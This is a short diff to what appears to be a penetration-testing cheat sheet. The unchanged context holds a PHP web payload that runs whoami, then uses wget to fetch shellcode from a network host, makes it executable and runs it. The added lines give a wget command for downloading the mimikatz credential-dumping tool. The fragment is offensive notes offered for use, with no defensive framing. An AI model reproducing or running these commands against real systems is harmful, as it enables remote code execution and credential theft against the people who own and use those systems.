@@ -155,3 +155,6 @@ Check if netcat present:
 
 get shellcode and execute :
 '<?php system("whoami; wget 192.168.44.44/shellcode; chmod 755 shellcode;./shellcode")?>'
+
+For mimikatz 2.1.1 :
+wget https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip
